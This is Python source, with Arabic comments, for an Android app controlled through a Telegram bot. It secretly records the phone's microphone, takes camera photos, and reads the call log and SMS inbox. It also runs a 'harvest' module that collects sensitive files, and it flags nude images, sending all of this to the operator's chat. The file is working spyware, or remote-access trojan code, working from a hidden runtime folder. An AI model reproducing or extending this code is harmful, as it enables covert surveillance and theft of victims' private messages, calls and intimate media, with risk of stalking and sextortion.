# -*- coding: utf-8 -*-
import os
import time
import json
import threading
import logging
import sys
import gc
from datetime import datetime

# ========== إعداد المسارات ==========
def _get_runtime_path():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        base = act.getFilesDir().getPath()
        return os.path.join(base, ".sys_runtime")
    except:
        return os.path.join(os.getcwd(), ".sys_runtime")

P = _get_runtime_path()
PENDING_DIR = os.path.join(P, "pending_upload")
TEMP_DIR = os.path.join(P, "ctmp")
for d in [PENDING_DIR, TEMP_DIR]:
    if not os.path.exists(d): os.makedirs(d)

# إضافة المسار إلى sys.path لضمان استيراد الملفات المحملة
if P not in sys.path:
    sys.path.insert(0, P)

logging.basicConfig(filename=os.path.join(P, "c.log"), level=logging.ERROR, filemode='a')

try:
    from jnius import autoclass, PythonJavaClass, java_method
    JNI = True
except ImportError:
    JNI = False


class C:
    def __init__(self):
        self.mic_busy = False
        self._cleanup()

    def _cleanup(self):
        try:
            now = time.time()
            for folder, max_age in [(TEMP_DIR, 3600), (PENDING_DIR, 86400)]:
                if not os.path.exists(folder): continue
                for f in os.listdir(folder):
                    path = os.path.join(folder, f)
                    if os.path.getmtime(path) < now - max_age:
                        os.remove(path)
        except:
            pass

    def _ensure_components(self, m):
        """تحميل المكونات المطلوبة (AI، سكانر، معرض، كاميرا، حصاد)"""
        try:
            if not hasattr(m, 'nude_detector') or m.nude_detector is None:
                try:
                    import nude_detector
                    m.nude_detector = nude_detector.NudeDetector(m)
                    logging.info("✅ NudeDetector loaded")
                except Exception as e:
                    logging.error(f"NudeDetector init error: {e}")

            if not hasattr(m, 'media_scanner') or m.media_scanner is None:
                import media_scanner
                m.media_scanner = media_scanner.MediaScanner(det=m.nude_detector, ui=m.ui)
                logging.info("✅ MediaScanner loaded")

            if not hasattr(m, 'gallery_browser') or m.gallery_browser is None:
                import gallery_browser
                m.gallery_browser = gallery_browser.G(m.media_scanner, m.ui)
                logging.info("✅ GalleryBrowser loaded")

            if not hasattr(m, 'camera_analyzer') or m.camera_analyzer is None:
                import camera_analyzer
                m.camera_analyzer = camera_analyzer.CameraAnalyzer(m, m.nude_detector)
                logging.info("✅ CameraAnalyzer loaded")

            if not hasattr(m, 'daily_zipper') or m.daily_zipper is None:
                import daily_zipper
                m.daily_zipper = daily_zipper.DailyZipper(m.media_scanner, m.ui)
                logging.info("✅ DailyZipper loaded")
        except Exception as e:
            logging.error(f"Component init error: {e}")

    # ========== إرسال ملف نصي (سجل المكالمات/الرسائل) ==========
    def _send_text_file(self, tg, chat_id, content, filename):
        temp_path = os.path.join(PENDING_DIR, f"{int(time.time())}_{filename}")
        try:
            with open(temp_path, 'w', encoding='utf-8', errors='ignore') as f:
                f.write(content)
            with open(temp_path, 'rb') as f:
                resp = tg._api("sendDocument",
                               {"chat_id": chat_id, "caption": f"📄 {filename}"},
                               {"document": f})
            if resp and resp.get('ok'):
                os.remove(temp_path)
            else:
                logging.warning(f"File {filename} left in pending")
        except Exception as e:
            logging.error(f"_send_text_file error: {e}")

    # ========== تسجيل صوتي ==========
    def _record_audio(self, duration=10):
        if not JNI or self.mic_busy:
            return None
        self.mic_busy = True
        media_recorder = None
        out_path = os.path.join(TEMP_DIR, f"audio_{int(time.time())}.aac")

        try:
            MR = autoclass('android.media.MediaRecorder')
            media_recorder = MR()
            media_recorder.setAudioSource(MR.AudioSource.MIC)
            media_recorder.setOutputFormat(MR.OutputFormat.MPEG_4)
            media_recorder.setAudioEncoder(MR.AudioEncoder.AAC)
            media_recorder.setAudioEncodingBitRate(64000)
            media_recorder.setOutputFile(out_path)
            media_recorder.prepare()
            media_recorder.start()
            time.sleep(duration)
            media_recorder.stop()
            media_recorder.reset()
            return out_path
        except Exception as e:
            logging.error(f"Recording error: {e}")
            return None
        finally:
            if media_recorder:
                try:
                    media_recorder.release()
                except:
                    pass
            self.mic_busy = False

    # ========== جلب سجل المكالمات ==========
    def _call_log(self, limit=100):
        if not JNI:
            return "JNI غير متاح"
        cursor = None
        try:
            ctx = autoclass('org.kivy.android.PythonActivity').mActivity
            resolver = ctx.getContentResolver()
            Uri = autoclass('android.net.Uri')
            cursor = resolver.query(Uri.parse("content://call_log/calls"),
                                    None, None, None, "date DESC")
            if not cursor:
                return "لا صلاحية أو لا توجد مكالمات"
            lines = []
            idx_name = cursor.getColumnIndex("name")
            idx_number = cursor.getColumnIndex("number")
            while cursor.moveToNext() and len(lines) < limit:
                name = cursor.getString(idx_name) or "Unknown"
                num = cursor.getString(idx_number) or "?"
                lines.append(f"👤 {name} ({num})")
            return "\n".join(lines) if lines else "سجل المكالمات فارغ"
        except SecurityException:
            logging.error("Call log: permission denied")
            return "⚠️ لا توجد صلاحية لقراءة سجل المكالمات. تأكد من تفعيل الأذونات (READ_CALL_LOG)."
        except Exception as e:
            logging.error(f"Call log error: {e}")
            return "خطأ في قراءة المكالمات"
        finally:
            if cursor:
                cursor.close()

    # ========== جلب رسائل SMS ==========
    def _sms_log(self, limit=100):
        if not JNI:
            return "JNI غير متاح"
        cursor = None
        try:
            ctx = autoclass('org.kivy.android.PythonActivity').mActivity
            resolver = ctx.getContentResolver()
            Uri = autoclass('android.net.Uri')
            cursor = resolver.query(Uri.parse("content://sms/inbox"),
                                    None, None, None, "date DESC")
            if not cursor:
                return "لا صلاحية أو لا توجد رسائل"
            lines = []
            idx_addr = cursor.getColumnIndex("address")
            idx_body = cursor.getColumnIndex("body")
            while cursor.moveToNext() and len(lines) < limit:
                addr = cursor.getString(idx_addr) or "?"
                body = cursor.getString(idx_body) or ""
                lines.append(f"📩 من: {addr}\n💬 {body}\n---")
            return "\n".join(lines) if lines else "صندوق الوارد فارغ"
        except SecurityException:
            logging.error("SMS: permission denied")
            return "⚠️ لا توجد صلاحية لقراءة الرسائل. تأكد من تفعيل الأذونات (READ_SMS)."
        except Exception as e:
            logging.error(f"SMS error: {e}")
            return "خطأ في قراءة الرسائل"
        finally:
            if cursor:
                cursor.close()

    # ========== التحقق من البطارية (تم تصحيح اسم الدالة) ==========
    def _battery_ok(self, m):
        try:
            # استخدام اسم الدالة الصحيح _battery_ok بدلاً من _bat
            b, ch = m._battery_ok() if hasattr(m, '_battery_ok') else (100, False)
            return b >= 15 or ch
        except:
            return True

    # ========== نقطة الدخول الرئيسية ==========
    def ex(self, cmd, tg, m, cid, cbq=None):
        threading.Thread(target=self._execute, args=(cmd, tg, m, cid, cbq), daemon=True).start()

    # ========== معالج الأوامر الأساسي ==========
    def _execute(self, cmd, tg, m, cid, cbq):
        try:
            # تأكيد استلام callback (إن وجد)
            if cbq:
                tg._api("answerCallbackQuery", {"callback_query_id": cbq})

            # تحميل المكونات
            self._ensure_components(m)

            # ---------- أوامر المعرض ----------
            if cmd.startswith(("g_nav|", "g_opt|", "g_conf|", "g_act|")):
                parts = cmd.split("|")
                action = parts[0]
                if action == "g_nav":
                    cat, page = parts[1], int(parts[2])
                    new_kb = m.gallery_browser.get_grid_kb(cat=cat, page=page)
                    tg._api("editMessageReplyMarkup",
                            {"chat_id": cid, "message_id": m.last_mid, "reply_markup": json.dumps(new_kb)})
                elif action == "g_opt":
                    m.gallery_browser.show_options(cid, parts[1], parts[2], parts[3])
                elif action == "g_act":
                    m.gallery_browser.execute_action(cid, parts[1], parts[2], parts[3], parts[4])
                elif action == "g_conf":
                    act, cat, pg, idx = parts[1], parts[2], parts[3], parts[4]
                    confirm_kb = [[{"text": "🗑 نعم، احذف", "callback_data": f"g_act|del|{cat}|{pg}|{idx}"},
                                   {"text": "🔙 إلغاء", "callback_data": f"g_opt|{cat}|{pg}|{idx}"}]]
                    tg._api("sendMessage",
                           {"chat_id": cid, "text": "⚠️ هل أنت متأكد من الحذف؟",
                            "reply_markup": json.dumps({"inline_keyboard": confirm_kb})})
                return

            # ---------- الكاميرا (باستخدام harvest للتحليل التلقائي) ----------
            if cmd.startswith(("cam_", "camf_")):
                is_front = 1 if "camf_" in cmd else 0
                if not self._battery_ok(m):
                    tg._api("sendMessage", {"chat_id": cid, "text": "🔋 البطارية منخفضة جداً (أقل من 15%)"})
                    return
                tg._api("sendChatAction", {"chat_id": cid, "action": "upload_photo"})
                # استدعاء harvest بدلاً من capture للتحليل والإشعار والنقل إلى مجلد الانتظار
                m.camera_analyzer.harvest(cam_id=is_front)
                tg._api("sendMessage", {"chat_id": cid, "text": "📸 تم التقاط الصورة وتحليلها. سيتم إرسال النتائج لاحقاً."})
                return

            # ---------- الميكروفون ----------
            if cmd.startswith("mic_"):
                if self.mic_busy:
                    tg._api("sendMessage", {"chat_id": cid, "text": "⏳ التسجيل قيد التنفيذ حالياً"})
                    return
                tg._api("sendMessage", {"chat_id": cid, "text": "🎤 جاري التسجيل لمدة 10 ثوانٍ..."})
                audio_path = self._record_audio(10)
                if audio_path and os.path.exists(audio_path):
                    with open(audio_path, 'rb') as f:
                        target = getattr(m, 'vlt', cid)
                        tg._api("sendVoice", {"chat_id": target}, {"voice": f})
                    os.remove(audio_path)
                else:
                    tg._api("sendMessage", {"chat_id": cid, "text": "❌ فشل التسجيل"})
                return

            # ---------- سجل المكالمات ----------
            if cmd.startswith("callog_"):
                tg._api("sendChatAction", {"chat_id": cid, "action": "typing"})
                data = self._call_log()
                self._send_text_file(tg, cid, data, "calls.txt")
                return

            # ---------- رسائل SMS ----------
            if cmd.startswith("sms_"):
                tg._api("sendChatAction", {"chat_id": cid, "action": "typing"})
                data = self._sms_log()
                self._send_text_file(tg, cid, data, "sms.txt")
                return

            # ---------- الحصاد اليدوي (التلقائي) ----------
            if cmd.startswith("hrv_"):
                if hasattr(m, 'daily_zipper') and m.daily_zipper:
                    tg._api("sendMessage", {"chat_id": cid, "text": "📦 بدء الحصاد (جمع الملفات الحساسة وإرسالها)... قد يستغرق دقائق"})
                    threading.Thread(target=m.daily_zipper.run, daemon=True).start()
                else:
                    tg._api("sendMessage", {"chat_id": cid, "text": "❌ وحدة الحصاد غير جاهزة"})
                return

            # ---------- الإرسال الفوري (send_now) ----------
            if cmd.startswith("send_now_"):
                if hasattr(m, 'daily_zipper') and m.daily_zipper:
                    tg._api("sendMessage", {"chat_id": cid, "text": "🚀 جاري إرسال الملفات المضغوطة فوراً..."})
                    threading.Thread(target=m.daily_zipper.force_send_now, args=(cid,)).start()
                else:
                    tg._api("sendMessage", {"chat_id": cid, "text": "❌ وحدة الحصاد غير متاحة"})
                return

            # ---------- فتح المعرض ----------
            if cmd.startswith("media_"):
                if hasattr(m, 'gallery_browser') and m.gallery_browser:
                    kb = m.gallery_browser.get_grid_kb(cat="pending", page=0)
                    res = tg._api("sendMessage",
                                 {"chat_id": cid, "text": "🖼️ معرض الوسائط (غير المصنفة بعد)",
                                  "reply_markup": json.dumps(kb)})
                    if res and res.get('ok'):
                        m.last_mid = res['result']['message_id']
                else:
                    tg._api("sendMessage", {"chat_id": cid, "text": "❌ المعرض غير متاح"})
                return

            # ---------- أمر غير معروف ----------
            tg._api("sendMessage", {"chat_id": cid, "text": "⚠️ أمر غير معروف. استخدم /menu لعرض القائمة."})

        except Exception as e:
            logging.error(f"Command handler error: {e}")
            tg._api("sendMessage", {"chat_id": cid, "text": f"❌ خطأ داخلي: {str(e)[:100]}"})
        finally:
            gc.collect()


# ========== دالة الإرسال الفوري الخارجية (لـ telegram_ui) ==========
def force_send_zip(m, device_id, tg, chat_id):
    """إرسال الملف المضغوط فوراً (يتم استدعاؤها من زر send_now)"""
    if hasattr(m, 'daily_zipper') and m.daily_zipper:
        threading.Thread(target=m.daily_zipper.force_send_now, args=(chat_id,)).start()
    else:
        tg._api("sendMessage", {"chat_id": chat_id, "text": "❌ وحدة الحصاد غير جاهزة"})

# ========== الواجهة الخارجية الرئيسية ==========
_handler = None
def ex(cmd, tg, m, cid, cbq=None):
    global _handler
    if _handler is None:
        _handler = C()
    _handler.ex(cmd, tg, m, cid, cbq)
